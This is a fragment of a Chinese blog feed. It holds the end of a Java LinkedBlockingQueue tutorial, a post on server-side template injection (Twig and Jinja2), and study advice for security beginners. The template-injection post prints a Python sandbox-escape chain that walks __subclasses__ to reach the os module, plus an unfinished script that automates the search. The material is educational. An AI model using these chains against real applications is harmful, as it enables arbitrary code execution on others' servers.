class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//下面的这两个函数就是在取函数上的翻版，所以不再详细介绍了</span></div><div class="line"></div><div class="line"><span class="comment">/* 在取操作的时候可以指定等待时间，超过上限的话就丢弃本次操作，返回null */</span></div><div class="line"><span class="function"><span class="keyword">public</span> E <span class="title">poll</span><span class="params">(<span class="keyword">long</span> timeout, TimeUnit unit)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</div><div class="line">    E x = <span class="keyword">null</span>;</div><div class="line">    <span class="keyword">int</span> c = -<span class="number">1</span>;</div><div class="line">    <span class="keyword">long</span> nanos = unit.toNanos(timeout);</div><div class="line">    <span class="keyword">final</span> AtomicInteger count = <span class="keyword">this</span>.count;</div><div class="line">    <span class="keyword">final</span> ReentrantLock takeLock = <span class="keyword">this</span>.takeLock;</div><div class="line">    takeLock.lockInterruptibly();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">while</span> (count.get() == <span class="number">0</span>) &#123;</div><div class="line">            <span class="keyword">if</span> (nanos &lt;= <span class="number">0</span>)</div><div class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">            nanos = notEmpty.awaitNanos(nanos);</div><div class="line">        &#125;</div><div class="line">        x = dequeue();</div><div class="line">        c = count.getAndDecrement();</div><div class="line">        <span class="keyword">if</span> (c &gt; <span class="number">1</span>)</div><div class="line">            notEmpty.signal();</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        takeLock.unlock();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (c == capacity)</div><div class="line">        signalNotFull();</div><div class="line">    <span class="keyword">return</span> x;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* 在取操作的时候看看需不需要等待，如果需要等待的话就丢弃本次操作，返回null */</span></div><div class="line"><span class="function"><span class="keyword">public</span> E <span class="title">poll</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">final</span> AtomicInteger count = <span class="keyword">this</span>.count;</div><div class="line">    <span class="keyword">if</span> (count.get() == <span class="number">0</span>)</div><div class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">    E x = <span class="keyword">null</span>;</div><div class="line">    <span class="keyword">int</span> c = -<span class="number">1</span>;</div><div class="line">    <span class="keyword">final</span> ReentrantLock takeLock = <span class="keyword">this</span>.takeLock;</div><div class="line">    takeLock.lock();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">if</span> (count.get() &gt; <span class="number">0</span>) &#123;</div><div class="line">            x = dequeue();</div><div class="line">            c = count.getAndDecrement();</div><div class="line">            <span class="keyword">if</span> (c &gt; <span class="number">1</span>)</div><div class="line">                notEmpty.signal();</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        takeLock.unlock();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (c == capacity)</div><div class="line">        signalNotFull();</div><div class="line">    <span class="keyword">return</span> x;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>LinkedBlockingQueue提供的搜索函数，移除函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//这两个函数都比较简单，所以不做具体实现分析，只阐述个大概吧</span></div><div class="line"><span class="comment">//首先因为搜索与移除都是要对整个链表进行的遍历操作，因此在锁上是要把</span></div><div class="line"><span class="comment">//入队锁出队锁都加上的，这时候就禁止了任何涉及到对队列修改的操作了</span></div><div class="line"></div><div class="line"><span class="comment">//然后因为在执行的时候已经加上锁了就只有这一个线程对队列进行操作，所以</span></div><div class="line"><span class="comment">//不会有竞争，也就不需要等待、唤醒之类的操作</span></div><div class="line"></div><div class="line"><span class="comment">//之后就是简单的对链表进行遍历的操作了</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (o == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    fullyLock();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">for</span> (Node&lt;E&gt; trail = head, p = trail.next;</div><div class="line">             p != <span class="keyword">null</span>;</div><div class="line">             trail = p, p = p.next) &#123;</div><div class="line">            <span class="keyword">if</span> (o.equals(p.item)) &#123;</div><div class="line">                unlink(p, trail);</div><div class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        fullyUnlock();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Object o)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (o == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    fullyLock();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">for</span> (Node&lt;E&gt; p = head.next; p != <span class="keyword">null</span>; p = p.next)</div><div class="line">            <span class="keyword">if</span> (o.equals(p.item))</div><div class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        fullyUnlock();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="一个简单的测试"><a href="#一个简单的测试" class="headerlink" title="一个简单的测试"></a>一个简单的测试</h2><p>我们模仿下库房的出库与入库操作吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.concurrent.LinkedBlockingQueue;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedBlockingQueueTest</span> </span>&#123;</div><div class="line">  <span class="comment">//我们的队列linkedBLockingQueue，使用阻塞队列对象</span></div><div class="line"><span class="keyword">private</span> LinkedBlockingQueue&lt;String&gt; linkedBlockingQueue;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">LinkedBlockingQueueTest</span><span class="params">()</span> </span>&#123;</div><div class="line">linkedBlockingQueue = <span class="keyword">new</span> LinkedBlockingQueue&lt;String&gt;();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//一个从库房中拿东西的内部类，我们设置其每1s从传动带上拿一次东西</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">BuyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</div><div class="line"></div><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">String thing;</div><div class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">thing = linkedBlockingQueue.take();</div><div class="line">System.out.println(<span class="string">"取出了"</span> + thing);</div><div class="line">sleep(<span class="number">1000</span>);</div><div class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</div><div class="line"><span class="comment">// TODO Auto-generated catch block</span></div><div class="line">e.printStackTrace();</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//一个往库房中放东西的内部类，我们设置其每0.5s往里面放一个东西</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">PutThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</div><div class="line"></div><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line"><span class="keyword">int</span> thing = <span class="number">1</span>;</div><div class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">linkedBlockingQueue.put(Integer.toString(thing));</div><div class="line">System.out.println(<span class="string">"放入了"</span> + thing);</div><div class="line">                  thing += <span class="number">1</span>;</div><div class="line">sleep(<span class="number">500</span>);</div><div class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</div><div class="line">e.printStackTrace();</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//main函数里开始执行，首先初始化这个对象，然后分别开启取线程与拿线程</span></div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">LinkedBlockingQueueTest linkedBlockingQueueTest = <span class="keyword">new</span> LinkedBlockingQueueTest();</div><div class="line">linkedBlockingQueueTest.new BuyThread().start();</div><div class="line">linkedBlockingQueueTest.new PutThread().start();</div><div class="line">&#125;</div><div class="line">  </div><div class="line">&#125;</div></pre></td></tr></table></figure><p>OUTPUT:</p><blockquote><p>取出了1<br>放入了1<br>放入了2<br>取出了2<br>放入了3<br>放入了4<br>取出了3<br>放入了5<br>放入了6<br>取出了4<br>放入了7<br>放入了8<br>取出了5<br>放入了9</p></blockquote><p>可以看到，开始放入了1，然后随即唤醒取线程拿出了1，然后0.5s后放东西线程接着放2….</p><p>这里的显示结果与我们想的有些不同的原因是，从读取操作到输出操作并非一个原子操作，所以输出结果可能与内部存放的步骤有些差异。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Java阻塞队列&quot;&gt;&lt;a href=&quot;#Java阻塞队列&quot; class=&quot;headerlink&quot; title=&quot;Java阻塞队列&quot;&gt;&lt;/a&gt;Java阻塞队列&lt;/h2&gt;&lt;p&gt;最近在学习Java的多线程编程，对并发编程的认识也从之前用python写简单多线程程序里对并发代码块上锁，到生产者消费者模型，wait()，notify()，阻塞队列这些概念，那么这里要介绍的阻塞队列是什么呢？&lt;/p&gt;
&lt;p&gt;考虑生产者消费者模型这种情况，在从队列中取元素与拿元素时加锁，但在这种场景下仅加锁是不够的，因为生产者往里面放元素的时候，还要考虑队列有没有满，如果已经满了的话就要wait一直到队列不满的时候再往里面放，消费者也是一样的，从队列里面拿元素的时候还要考虑队列是不是空的，如果是空的就要一直wait到非空的时候。注意这里我们就从加锁操作引出了wait(), notify()两个概念，在并发编程中结合这两个概念可以实现更多更精巧复杂的多线程场景。&lt;/p&gt;
&lt;p&gt;好像扯得有点远，还没有说到我们要介绍的阻塞队列的概念，其实阻塞队列就源自于生产者消费者模型中所涉及到的场景，在多线程下很多场景都要有一些临界资源，这些资源可能被多个线程同时访问，所以就要进行加锁啊，wait()，notify()等操作，其实个人觉得加锁还好，就是将一个对临界资源操作的语句块圈起来就好，但要实现wait，notify操作就有些麻烦了，放东西的时候需要一直判断是不是满了，满了还要wait，然后操作完了后还要记得唤醒各种线程防止死锁等等，如果都自己实现的话就有点太麻烦了，更重要的是容易出错，所以这里就引入了阻塞队列的概念，不是临界资源的操作需要加锁，判满，判空等等各种操作嘛，那好，临界资源你直接用我给你写的类，我在类里面已经对所有需要处理的多线程场景进行了处理，使其变得线程安全了，使用这种类的话，自己完全不需要考虑多线程的线程安全问题，而这种类就是我们要介绍的阻塞队列。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>从模板注入漏洞谈起，到一个烂尾的寻找python沙盒绕过的代码</title>
    <link href="https://someonesometimes.github.io/2017/10/21/%E4%BB%8E%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%B0%88%E8%B5%B7/"/>
    <id>https://someonesometimes.github.io/2017/10/21/从模板注入漏洞谈起/</id>
    <published>2017-10-21T10:17:03.000Z</published>
    <updated>2017-10-21T11:05:15.805Z</updated>
    
    <content type="html"><![CDATA[<p>宝宝很烦，代码烂尾了，宝宝并不想说什么</p><a id="more"></a><h3 id="从模板注入漏洞谈起"><a href="#从模板注入漏洞谈起" class="headerlink" title="从模板注入漏洞谈起"></a>从模板注入漏洞谈起</h3><p>不管是什么语言，php也好，python也好，在做前端的时候都会有模板技术，这可以将前端框架与后端所提供的动态值分离，对于后台开发者来说，只需要拿着前端模板然后像””.format()一样，来为里面的参数提供不同的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</div><div class="line"><span class="comment">// 这里面Hello &#123;&#123;name&#125;&#125;就是模板，array("name" =&gt; $_GET["name"])就是在为其赋值</span></div><div class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;&#123;name&#125;&#125;"</span>, <span class="keyword">array</span>(<span class="string">"name"</span> =&gt; $_GET[<span class="string">"name"</span>]));  </div><div class="line"><span class="keyword">echo</span> $output;</div></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</div><div class="line"><span class="comment">// 这种情况是直接填入到里面去</span></div><div class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  </div><div class="line"><span class="keyword">echo</span> $output;</div></pre></td></tr></table></figure><p>上述两种都可以实现填充，然而会存在一种问题：<br>第一种是类似format()的函数实现，大多数模板实现这个功能的时候都会进行转义，所以xss是没法构造的，然而第二种的方式就是将<code>$_GET[&#39;name&#39;]</code>直接放到了模板里面，不会进行转义，所以可以构造xss</p><h3 id="模板可能还支持对应语言的“编程功能”以及一些简单的运算"><a href="#模板可能还支持对应语言的“编程功能”以及一些简单的运算" class="headerlink" title="模板可能还支持对应语言的“编程功能”以及一些简单的运算"></a>模板可能还支持对应语言的“编程功能”以及一些简单的运算</h3><p>模板并不是静态的放进去，虽然模板产品类型很多，但或多或少都能执行一些逻辑</p><p>在Twig中，模板支持运行这样简单的逻辑，如果并没有运行的话，可能是关键字符被过滤，并不是模板不支持这样写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;<span class="number">2</span>*<span class="number">10</span>&#125;&#125;   name=&#123;&#123;<span class="number">2</span>+<span class="number">2</span>&#125;&#125;</div></pre></td></tr></table></figure><p>而在python的Jinja2模板中，就能支持更多更强大的逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</div><div class="line"></div><div class="line">str = <span class="string">"&#123;% for i in [1,2,3] %&#125;&#123;&#123; i &#125;&#125;&#123;% endfor %&#125;"</span></div><div class="line">template = Template(<span class="string">'your input: &#123;&#125;'</span>.format(str))</div><div class="line"><span class="keyword">print</span> (template.render())</div></pre></td></tr></table></figure><p>是不是感觉很像python的语法？那么是不是我们就相当于拿到了python的任意代码执行？其实还差的远，因为虽然我们能在模板里书写任意代码，但并不是能够调用任意函数，就像python程序里没有import os就不能使用os.system()一样。在Jinja2里如果我们想“import os”，需要这样做</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">template.globals[<span class="string">'os'</span>] = os</div></pre></td></tr></table></figure><p>显然我们没有写这种代码的能力。。。但其实还是可以的，我们不用import os模块就能使用os的，这里就需要了解python的沙盒绕过了，也是今天我花时间最多却没搞出来的点。。。</p><h3 id="python沙盒绕过"><a href="#python沙盒绕过" class="headerlink" title="python沙盒绕过"></a>python沙盒绕过</h3><p>还是先大致统计下目前已知的需要用到沙盒绕过的情景</p><ul><li>本文中通过模板引擎注入代码，但没法import，也就相当于限制了一些关键函数的使用</li><li>昨天USTC比赛里见到了python反序列化，所以也相当于可以执行任意代码，只是一些关键的模块被禁用了</li></ul><p><strong>如果程序不从函数注册来判断那些函数可以使用的话，我们可以通过以下过程来得到我们要用的模块或者函数</strong></p><p>通过一个class的各种属性或方法，可以得到很多相关的东西，其中就可能包含我们想要的模块或函数</p><ul><li><code>class.__dict__</code></li><li><code>class.__init__.__globals__</code></li><li><code>class.func_globals</code></li></ul><p>应该还有很多，我们可以自己去测试</p><p><img src="https://ws1.sinaimg.cn/large/93e435bbly1fkq0jmaixzj20i1051q69.jpg" alt=""></p><p>通过<code>class.__class__.__base__.__subclasses__()</code>我们就可以得到很多子类，其实在对上面的方法进行测试的时候，我们有时也可以看到很多类</p><p><img src="https://ws1.sinaimg.cn/large/93e435bbly1fkq0hprcbhj20id04nt8x.jpg" alt="![img](https://ws1.sinaimg.cn/large/93e435bbly1fkq0hprcbhj20id04nt8x.jpg)"></p><p>于是我们通过一个个跳转，就可以最终找到我们要的函数或者模块，举个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [].__class__.__base__.__subclasses__():</div><div class="line">    <span class="keyword">if</span> i.__name__ == <span class="string">"catch_warnings"</span>:</div><div class="line">        <span class="keyword">print</span> i.__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'os'</span>]</div><div class="line">        </div><div class="line">output:</div><div class="line">  &lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'C:\Python27\lib\os.pyc'</span>&gt;</div></pre></td></tr></table></figure><h3 id="考虑实现自动查找定位到一个函数要走的路径"><a href="#考虑实现自动查找定位到一个函数要走的路径" class="headerlink" title="考虑实现自动查找定位到一个函数要走的路径"></a>考虑实现自动查找定位到一个函数要走的路径</h3><p>从前面举的例子来看，我们想找到一个函数很能需要经过很多跳才行，能不能遍历下自动去找呢？</p><p>注意，代码烂尾了。。。最后并没有实现想要的功能，哪里出问题了有说不太清，最后时间预算不够了，就只能烂尾了。。。如果以后有时间再尝试写写吧</p><p>首先阐述下我的实现：</p><p>我们有一个初始类，一般是[]或()，然后通过<code>.__class__.__base__.__subclasses__()</code>扩展成很多的子类，于是我们就维护一个类列表，去遍历分析它，虽然一开始列表里只有一个，但我们对每一个分析的类都去寻找子类并将新找到的类及时添加到列表末尾</p><p>然后在对每个类分析的过程中，尝试通过上面提到的一种获取函数的方法<code>.__init__.__globals__</code>来从中提取函数，如果找到了输出出来，有一点比较复杂的是，在提取函数语句的输出结果中，有很多中可能，有可能我们要的函数是在一个列表或字典中，这时候还需要再深入去分析，所以我就写成了一个递归</p><p>然后就是代码了，烂尾的代码。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> warnings</div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line">大致的过程：</div><div class="line">- 首先从一个类生成多个类</div><div class="line">- 对类生成各种各样的东西，分这几种类型：</div><div class="line">    - 函数直接看是不是</div><div class="line">    - 类的话，就放到类遍历列表里面去，当然要先判断有没有才行</div><div class="line">    - 字典的话，生成value去再来分析</div><div class="line">    - 列表的话，直接去分析</div><div class="line">"""</div><div class="line"></div><div class="line">class_list = []</div><div class="line">class_original = []</div><div class="line">class_list.append(class_original)</div><div class="line">goal_function = open</div><div class="line"></div><div class="line"><span class="comment">#通过__class__.__base__.__subclasses__生成子class</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_subclass</span><span class="params">(_class)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">return</span> _class.__class__.__base__.__subclasses__()</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">return</span> []</div><div class="line"></div><div class="line"><span class="comment">#从class中通过.__init__.__globals__来得到所有的各种类型的值</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_something</span><span class="params">(_class)</span>:</span></div><div class="line">    <span class="keyword">if</span> hasattr(_class.__init__, <span class="string">'__globals__'</span>):</div><div class="line">        <span class="keyword">return</span> _class.__init__.__globals__</div><div class="line"></div><div class="line"><span class="comment">#递归式的对一个列表进行分析</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysis_list</span><span class="params">(list)</span>:</span></div><div class="line">    <span class="keyword">if</span> list:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> list:</div><div class="line">            <span class="keyword">if</span> type(i) == type([]):</div><div class="line">                analysis_list(i)</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">if</span> type(i) == type(&#123;&#125;):</div><div class="line">                analysis_dict(i)</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">if</span> hasattr(i, <span class="string">'__call__'</span>):</div><div class="line">                <span class="keyword">if</span> i == goal_function:</div><div class="line">                    <span class="keyword">print</span> (i)</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="comment">#还不是话，就推断是类了,但是目前还不敢肯定就这几种类型</span></div><div class="line">            <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> class_list:</div><div class="line">                class_list.append(i)</div><div class="line"></div><div class="line"><span class="comment">#递归式的对一个字典进行分析</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysis_dict</span><span class="params">(dict)</span>:</span></div><div class="line">    <span class="keyword">if</span> dict:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dict.values() :</div><div class="line">            <span class="keyword">if</span> type(i) == type([]):</div><div class="line">                analysis_list(i)</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">if</span> type(i) == type(&#123;&#125;):</div><div class="line">                analysis_dict(i)</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">if</span> hasattr(i, <span class="string">'__call__'</span>):</div><div class="line">                <span class="keyword">if</span> i == goal_function:</div><div class="line">                    <span class="keyword">print</span> (i)</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="comment">#还不是话，就推断是类了,但是目前还不敢肯定就这几种类型</span></div><div class="line">            <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> class_list:</div><div class="line">                class_list.append(i)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> class_list:</div><div class="line"><span class="comment">#首先增加一波子类</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> get_subclass(i):</div><div class="line">        <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> class_list:</div><div class="line">            class_list.append(j)</div><div class="line">    <span class="comment"># print class_list</span></div><div class="line"></div><div class="line">    <span class="comment">#开始对这个类进行分析查找</span></div><div class="line">    analysis_dict(get_something(i))</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;宝宝很烦，代码烂尾了，宝宝并不想说什么&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>给信息安全入门者的一点建议</title>
    <link href="https://someonesometimes.github.io/2017/10/01/%E7%BB%99%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E8%80%85%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BB%BA%E8%AE%AE/"/>
    <id>https://someonesometimes.github.io/2017/10/01/给信息安全入门者的一些建议/</id>
    <published>2017-10-01T15:45:00.000Z</published>
    <updated>2017-10-09T15:57:00.069Z</updated>
    
    <content type="html"><![CDATA[<p>这是给学校里学弟学妹们写的，师傅们就别看了orz。。</p><a id="more"></a><p>首先要声明的是，我的水平也不高，如果非要说比你们有什么优势的话，也就是早学了一两年而已，说实话我也不知道自己现在有没有真正入门，因为每搞清楚一个方面后，又随即会发现还有很多新的方向需要学习。总之信息安全并不是一门容易学好的学科，从现状来看，可以说90%人一直到了大四毕业也没有真正的入门安全，50%的人荒废学业，一事无成，另40%的人按照学校的课程开设安排学习而没有自己的一点见解最后成为了一名程序员2333，所以在你们入门安全之前，有件事情一定要想好————你们是否真的未来打算从事安全行业？我身边有太多同学编的一手好程序，精通算法数据结构，他们的大学也很充实，但就专业来说，他们最后并没有选择信息安全方向.这并没有任何问题，只是个人的选择而已，所以同学们，如果你们并没有对安全多么感兴趣，按照你们自己的想法学就好，最后的信息安全方向并不是每个人都一定要走的，无论是什么方向，大学四年没有荒废，能学得一技之长就OK。</p><p>下面我会基于自己的学习经历，把我摸索出的路讲给你们，其中有一些很关键，还有一些只是个人的一点想法或者说面对岔路的选择，自取吧</p><p>作为之前没有任何安全知识与基础的大学生，编程是首先也是必须要学习的，这是立足之本，不仅要学，还要学好，学广，面对别人写的程序，如果你连代码都看不懂又谈何挖掘其中的漏洞呢？所以信息安全从业者必须能写得一首好代码，而且懂得多门编程语言，这点上学校只会教授C++与Java，其他的是你们要自己去学的</p><p>还有一点是这四年时间的安排问题，我们在大四的时候才会开设诸如计算机病毒学，网络攻防这些课程，很显然对于一个毕业后面向社会的大学生太晚了，所以就要提前自学，那么我们需要学习什么呢？首先如果没有基础的话肯定不能上来就搞安全，以我自身为例，我选择的网络安全方向，那么就需要学习计算机网络，网站相关的前端语言如JavaScript，学习HTML，学习至少一种服务端语言（我选择的PHP），然后至少要熟练的掌握一门脚本语言，这里大部分人都选择的Python，当然你也可以使用C++，Java这些作脚本语言用，但其实就算选择其他脚本语言的话，作为一名黑客，不懂Python总感觉还差那么一回事。以上就是在正式入门安全之前需要掌握的知识，上面提到的任何一方面如果没有接触过的话，做安全时都会感觉难以下手，就像你小学面对一篇高考英语阅读一样寸步难行。 